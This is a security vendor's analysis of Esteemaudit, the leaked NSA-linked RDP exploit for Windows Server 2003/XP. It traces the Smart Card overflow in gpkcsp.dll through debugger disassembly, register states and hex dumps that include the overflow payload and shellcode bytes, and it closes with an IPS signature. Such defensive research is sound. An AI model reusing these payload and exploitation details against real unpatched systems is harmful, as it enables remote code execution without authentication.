@@ -1,0 +1,192 @@
+In this blog, the FortiGuard team takes a look at Esteemaudit, which is an exploit that was included in the set of cybertools leaked by the hacker group known as "Shadow Brokers."
+They claim that they collected this set of cybertools from the compromised data of "Equation Group," a threat actor alleged to be tied to the United States National Security Agency (NSA).
+Esteemaudit is a Remote Desktop Protocol (RDP) exploit that targets Microsoft Windows Server 2003 / Windows XP.
+The vulnerability this RDP exploit targets will not be patched since Microsoft has stopped supporting these two products.
+By exploiting this vulnerability, a threat actor can target a remote RDP Service and eventually take control of the compromised system.
+The vulnerability exploited by this attack is related to Smart Card authentication used when logging onto the system via the RDP service.
+In this post, we will examine the Windows Smart Card logon mechanism, and figure out the root cause of this vulnerability.
+Smart Card logon is supported by all Windows versions after Windows 2000.
+It contains a chip that stores the user logon information, along with the private key and public certificate key.
+By inserting it into a Smart Card Reader attached to the computer, and typing in a Personal Identification Number (PIN), a user can securely log onto the Windows system.
+When logon occurs via the RDP service, the remote machine running the RDP service communicates with the local computer, which then connects to the Smart Card Reader, requests the information in the Smart Card, and verifies the PIN.
+This vulnerability is located in the "MyCPAcquireContext()" function in "gpkcsp.dll", which is called by "winlogon.exe" in the new windows session.
+The "MyCPAcquireContext()" function is used to set up the Windows Cryptographic Service Providers (CSP) context.
+It reads the data from the Smart Card and sets the value of the fields of the CSP context structure.
+If the data read from the Smart Card is overlarge, the field buffer used by CSP context structure overflows and overwrites another field, eventually enabling arbitrary code execution.
+First, we’ll run Esteemaudit and check the attack output.
+Esteemaudit is an executable file used in the FuzzBunch framework.
+Once it is configured, and the target machine (a Windows Server 2003 SP2 with the Domain Controller configured) is set up correctly, we get the following output:
+The configuration:
+Here, the ret0c value of 134241925(0x08005e85), is used in the shellcode, and runs just after triggering the vulnerability.
+We can see it in the following analysis.
+The attack output:
+Here, the entries "[+]SELECT FILE - Don't care which", "[+]GET_RSPONSE - from SELECT_FILE", "READ_BINARY - start of file", and "[+]Shellcode sent" are all related to the vulnerability and the shellcode.
+Next, we will explain how they work.
+There are three buffer addresses that will be used in our analysis.
+Receive Buffer "0x80190d8"(invariable) is used to receive the data from the Smart Card, Send Buffer "0x80192d8"(invariable) is used to store the data sent to the local computer with the Smart Card Reader, and CSP context structure Buffer "0x2a6f40"(variable) is the base address of the CSP context structure.
+The following assembly code snippet was taken from windbg on Windows Server 2003 SP2.
+Comments added by me have been highlighted.
+gpkcsp!MyCPAcquireContext:
+001b:0800df79 89b408a0000000 mov dword ptr [eax+ecx+0A0h],esi --->set the "[A0h]" field as null,[A0h] is hKey field, which will be used to trigger the vulnerability later.
+001b:0800df80 8b03 mov eax,dword ptr [ebx]
+001b:0800df82 8b0dd86d1708 mov ecx,dword ptr [gpkcsp!ProvCont (08176dd8)]
+001b:0800df88 69c0b8000000 imul eax,eax,0B8h
+001b:0800df8e c6840898000000ff mov byte ptr [eax+ecx+98h],0FFh ds:0023:002a6fd8=00
+MyCPAcquireContext initializes the CSP context structure field at first.
+It sets all the fields as NULL.
+001b:0800666b 57 push edi
+001b:0800666c 6a10 push 10h --->the data length that will be sent
+001b:0800666e 58 pop eax
+001b:0800666f c605d892010800 mov byte ptr [gpkcsp!IsProgButtonClick+0x20c (080192d8)],0
+001b:08006676 c605d9920108a4 mov byte ptr [gpkcsp!IsProgButtonClick+0x20d (080192d9)],0A4h --->the Smart Card standard command type
+001b:0800667d c605da92010804 mov byte ptr [gpkcsp!IsProgButtonClick+0x20e (080192da)],4
+001b:08006684 c605db92010800 mov byte ptr [gpkcsp!IsProgButtonClick+0x20f (080192db)],0
+001b:0800668b c605dc9201080b mov byte ptr [gpkcsp!IsProgButtonClick+0x210
+(080192dc)],0Bh
+....
+001b:080066a8 6a00 push 0
+001b:080066aa 50 push eax
+001b:080066ab 66a5 movs word ptr es:[edi],word ptr [esi]
+001b:080066ad 68d8920108 push offset gpkcsp!IsProgButtonClick+0x20c (080192d8)
+001b:080066b2 ff35cc110008 push dword ptr [gpkcsp!_imp__g_rgSCardT0Pci (080011cc)]
+001b:080066b8 a348701708 mov dword ptr [gpkcsp!ProvCont+0x270 (08177048)],eax
+001b:080066bd a1d86d1708 mov eax,dword ptr [gpkcsp!ProvCont (08176dd8)]
+001b:080066c2 a4 movs byte ptr es:[edi],byte ptr [esi]
+001b:080066c3 c705dc6d170800020000 mov dword ptr [gpkcsp!ProvCont+0x4 (08176ddc)],200h
+001b:080066cd ff740304 push dword ptr [ebx+eax+4]
+001b:080066d1 e81ff5ffff call gpkcsp!DoSCardTransmit (08005bf5) --->call the driver "termdd.sys" to send the command to the local computer with Smart Card Reader.
+Windows uses the driver "Termdd.sys" to communicate with the Smart Card machine in the Windows kernel, according to Smart Card Standard ISO 7816-4.
+"gpkcsp.dll" constructs the command bytes in Send Buffer, and calls "Termdd.sys" to transmit the data.
+Here, it sends the "SELECT_FILE" command to the Smart Card machine.
+The Send Buffer looks like this:
+080192d8 00 a4 04 00 0b a0 00 00 00 18 0f 00 01 63 00 01
+Here, "a4" means Command type "SELECT_FILE".
+This command is used to select a file in the Smart Card, on the common condition, and the data following the Command type indicates the File Identifier.
+"04 00" means that it will select an application inside the Smart Card directly, but not select a file.
+The data following that marker is the application ID.
+The attack output "[+]SELECT FILE - Don't care which " indicates that Esteemaudit receives this command.
+Esteemaudit then responds with a simple status code, and "MyCPAcquireContext" sends the five-byte "GET RESPONSE" message below:
+080192d8 00 c0 00 00 ff
+Here, "ff" tells the Smart Card that the limit for the Receive Buffer is 0xff, and asks the Smart Card (Esteemaudit simulates a smart card to send data) to send the data related to the above "SELECT FILE" command.
+It shows "[+]GET_RSPONSE - from SELECT_FILE" in the attack output.
+]Esteemaudit then sends the data to overwrite the [A0h] field of the CSP context structure.
+We can check the message in the Receive Buffer.
+The message length is 0xb2:
+080190d8 13 d6 28 1e c2 e9 d2 bc 4b 96 ba e2 36 cb 0b bb ..(.....K...6...
+080190e8 8b 64 c6 ef cc ea bc 56 09 e1 b3 34 49 45 0b d4 .d.....V...4IE..
+080190f8 d5 38 e6 c4 a6 5e 24 7e 90 00 22 c0 54 71 ad 5e .8...^$~..".Tq.^
+08019108 43 c0 01 dd 9e 45 4c 91 51 09 92 92 35 99 5a 47 C....EL.Q...5.ZG
+08019118 8d 3f 17 dd cd 3b a9 59 70 f4 e3 ae e8 b3 7a 80 .?...
+;.Yp.....z.
+08019128 6e eb 53 f0 b9 97 81 32 68 ba ef 31 26 7e 17 16 n.S....2h..1&~..
+08019138 46 0a a6 e9 f4 8b 87 22 a8 78 29 69 03 a4 79 53 F......".x)i..yS
+08019148 bb 16 6b 5f bc 40 81 02 32 8d 3b 00 90 da cb e3 ..k_.@..2.
+;.....
+08019158 55 dc 04 d2 9e fe e6 98 3d bb a9 14 7a dc 90 01 U.......=...z...
+08019168 08 00 90 00 00 45 7d b6 d7 45 6e 58 ad 3d 07 3b .....E}..EnX.=.
+; --->the malicious data includes address "0x080190dc", which is in the Receive Buffer.
+08019178 56 22 2d e9 1a ef fc 5f 7f 13 9f 38 ed 29 49 51 V"-...._...8.
+)IQ
+08019188 e5 f8 00
+001b:0800e1c4 e82c7affff call gpkcsp!DoSCardTransmit (08005bf5) -->transmits the data and gets the new message from the Smart Card.
+001b:0800e1de 85c0 test eax,eax
+001b:0800e1e0 743c je gpkcsp!MyCPAcquireContext+0x758 (0800e21e) --->jump to 0x800e21e
+001b:0800e21e 8b13 mov edx,dword ptr [ebx]
+001b:0800e220 8b35d86d1708 mov esi,dword ptr [gpkcsp!ProvCont (08176dd8)]
+001b:0800e226 69d2b8000000 imul edx,edx,0B8h
+001b:0800e22c 6a20 push 20h
+001b:0800e22e 33c0 xor eax,eax
+001b:0800e230 8d7c3218 lea edi,[edx+esi+18h]
+001b:0800e234 8bb5a4f0ffff mov esi,dword ptr [ebp-0F5Ch]
+001b:0800e23a 59 pop ecx
+001b:0800e23b f3ab rep stos dword ptr es:[edi]
+001b:0800e23d 803ddc90010830 cmp byte ptr [gpkcsp!IsProgButtonClick+0x10 (080190dc)],30h ds:0023:080190dc=c2 --->0x80190dc is "0xc2", it should not be "0x30" to trigger the vulnerability
+001b:0800e26b 83baa400000000 cmp dword ptr [edx+0A4h],0 ds:0023:002a6fe4=00000000 ---> check to see if the [A4h] field of the CSP context structure has been set to NULL.
+If it is NULL, it is set as NULL in the initialization.
+001b:0800e277 6a20 push 20h
+001b:0800e279 59 pop ecx
+001b:0800e27a 33c0 xor eax,eax
+001b:0800e27c f3ab rep stos dword ptr es:[edi]
+001b:0800e27e eb22 jmp gpkcsp!MyCPAcquireContext+0x7dc (0800e2a2)
+001b:0800e280 8b0ddc6d1708 mov ecx,dword ptr [gpkcsp!ProvCont+0x4 (08176ddc)] ---->data length "0xb2"
+001b:0800e286 83c1f9 add ecx,0FFFFFFF9h --->subtract 7 header bytes
+001b:0800e289 8bc1 mov eax,ecx
+001b:0800e28b c1e902 shr ecx,2
+001b:0800e28e bedd900108 mov esi,offset gpkcsp!IsProgButtonClick+0x11 (080190dd)
+001b:0800e293 f3a5 rep movs dword ptr es:[edi],dword ptr [esi] es:0023:002a6f58=00000000 ds:0023:080190dd=4bbcd2e9 --->copy "0xb2-7=0xab" bytes to the CSP context base address and overwrite the [A0h] field
+The following is the memory overwritten:
+002a6fe0 dc 90 01 08 00 90 00 00 45 7d b6 d7 45 6e 58 ad 3d 07 3b 56 22 2d e9
+002a6ff7 1a ef fc 5f 7f 13 9f 38 ed
+"MyCPAcquireContext" sends the "READ_BINARY" command to read the file data from the Smart Card, and Esteemaudit sends the shellcode to trigger the vulnerability.
+It shows "READ_BINARY - start of file" and "[+]Shellcode sent" in the attack output.
+We can see the shellcode in the Receive Buffer below:
+080190d8 4d 2b e9 53 7a 1e 01 08 8e 11 01 08 85 5e 00 08 M+.Sz........^.. --->we can see ret0C=134241925(0x08005e85) and other arguments in the configuration
+080190e8 dd be 00 08 11 11 11 11 cf ca c2 2c 4c 63 8a d7 ...........,Lc..
+080190f8 00 00 00 00 4d 13 c4 38 ef 1f 01 08 78 90 01 08 ....M..8....x...
+08019108 6f ec 9f f8 22 22 22 22 00 00 00 00 e6 f6 e0 09 o...""""........
+08019118 00 40 00 00 cc 28 01 08 8f 00 00 00 00 03 fe 7f .@...
+(..........
+08019128 74 50 01 08 48 91 01 08 18 91 01 08 ff ff ff ff tP..H...........
+08019138 30 91 01 08 18 91 01 08 40 00 00 00 30 91 01 08 0.......@...0...
+08019148 b0 04 64 8b 00 2d 00 06 00 00 89 c4 89 c6 e8 00 ..d..-..........
+08019158 00 00 00 90 5d 8b 85 d5 00 00 00 89 46 04 8b 85 ....].......F...
+08019168 d9 00 00 00 89 46 0c 31 c0 89 46 10 89 46 14 8b .....F.1..F..F..
+08019178 85 dd 00 00 00 8b 00 8b 80 bc 00 00 00 89 46 18 ..............F.
+08019188 8b 85 e1 00 00 00 8b 00 89 46 1c 8b 85 e5 00 00 .........F......
+08019198 00 8b 00 89 46 20 8b 46 0c 89 46 28 31 c0 89 46 ....F .F..F(1..F
+080191a8 2c e8 b5 00 00 00 85 c0 75 66 8b 46 2c 89 46 08 ,.......uf.F,.F.
+080191b8 8b 46 0c 2b 46 10 50 89 e0 50 8b 46 08 03 46 10 .F.+F.P..P.F..F.
+080191c8 50 31 c0 50 ff 76 14 ff 76 04 ff 76 20 ff 76 18 P1.P.v..v..v .v.
+080191d8 ff 56 1c 59 89 46 14 8b 46 10 01 c8 89 46 10 8b .V.Y.F..F....F..
+080191e8 46 08 89 46 24 8b 46 10 3b 85 d9 00 00 00 7c c0 F..F$.F.
+;.....|.
+080191f8 31 c0 89 46 10 8b 4e 24 89 c8 89 01 51 ff 71 04 1..F..N$....Q.q.
+08019208 89 c8 83 c0 14 50 ff d0 31 c0 eb 03 31 c0 48 50 .....P..1...1.HP
+08019218 8b 46 2c 85 c0 74 0e 8b 58 10 e8 58 00 00 00 85 .F,..t..X..X....
+08019228 db 74 02 ff d3 31 e4 c3 d8 92 01 08 f2 62 00 00 .t...1.......b..
+08019238 d8 6d 17 08 9c 11 00 08 cc 11 00 08 b8 12 00 00 .m..............
+08019248 00 8d 54 24 04 cd 2e c2 18 00 c2 18 00 b8 57 00 ..T$..........W.
+08019258 00 00 8d 54 24 04 cd 2e c2 10 00 6a 40 68 00 30 ...T$......j@h.0
+08019268 00 00 8d 46 28 50 31 c0 50 8d 46 2c 50 31 c0 48 ...F(P1.P.F,P1.H
+08019278 50 e8 c6 ff ff ff c3 68 00 80 00 00 8d 46 28 50 P......h.....F(P
+08019288 8d 46 2c 50 31 c0 48 50 e8 c0 ff ff ff c3 8e 58 .F,P1.HP.......X
+001b:08005fbd a1d86d1708 mov eax,dword ptr [gpkcsp!ProvCont (08176dd8)]
+001b:08005fc2 03c6 add eax,esi
+001b:08005fc4 83b8b000000000 cmp dword ptr [eax+0B0h],0 ---> check the [B0h] field of the CSP context structure.
+It has already been overwritten at the same time as the [A0h] field , and is no longer NULL
+001b:08005fcb 0f8598000000 jne gpkcsp!Select_MF+0x139 (08006069) --->check failed, jump to end the communication and release the CSP context structure
+....
+001b:08007c11 a1d86d1708 mov eax,dword ptr [gpkcsp!ProvCont (08176dd8)]
+001b:08007c16 897c0614 mov dword ptr [esi+eax+14h],edi
+001b:08007c1a a1d86d1708 mov eax,dword ptr [gpkcsp!ProvCont (08176dd8)]
+001b:08007c1f 8b8406a0000000 mov eax,dword ptr [esi+eax+0A0h] --->get the overwritten value and pass it as the argument
+001b:08007c26 3bc7 cmp eax,edi
+001b:08007c28 740f je gpkcsp!ReleaseProvider+0xfd (08007c39)
+001b:08007c2a 50 push eax
+001b:08007c2b ffd3 call ebx {ADVAPI32!CryptDestroyKey (77f3f5b0)}
+We can check register value here:
+kd> r
+eax=080190dc ebx=77f3f5b0 ecx=002a6828 edx=00440001 esi=000000b8 edi=00000000 --->eax is overwritten
+eip=08007c2b esp=006ce424 ebp=006ce438 iopl=0 nv up ei pl nz na po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
+gpkcsp!ReleaseProvider+0xef:
+001b:08007c2b ffd3 call ebx {ADVAPI32!CryptDestroyKey (77f3f5b0)}
+ADVAPI32!CryptDestroyKey:
+001b:77f3f605 85c0 test eax,eax
+001b:77f3f607 7463 je ADVAPI32!CryptDestroyKey+0xbf (77f3f66c)
+001b:77f3f609 33db xor ebx,ebx
+001b:77f3f60b 43 inc ebx
+001b:77f3f60c 895ddc mov dword ptr [ebp-24h],ebx
+001b:77f3f60f ff762c push dword ptr [esi+2Ch]
+001b:77f3f612 ff7770 push dword ptr [edi+70h]
+001b:77f3f615 ff5608 call dword ptr [esi+8] ---->shellcode executed
+kd> r
+eax=00000001 ebx=00000001 ecx=77f50c75 edx=00440001 esi=080190dc edi=08019078
+eip=77f3f615 esp=006ce3d8 ebp=006ce41c iopl=0 nv up ei pl nz na po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
+ADVAPI32!CryptDestroyKey+0x6e:
+001b:77f3f615 ff5608 call dword ptr [esi+8] ds:0023:080190e4=08005e85 --->0x08005e85 is the Ret0C in the shellcode, which begins the ROP chain.
+The following image shows the successful attack output:
+Note that authentication is NOT required to exploit this vulnerability.
+To address this vulnerability, Fortinet has released IPS signature MS.Windows.Shadow.Broker.ESTEEMAUDIT.Code.Execution.
+Sign up for weekly Fortinet FortiGuard Labs Threat Intelligence Briefs and stay on top of the newest emerging threats.
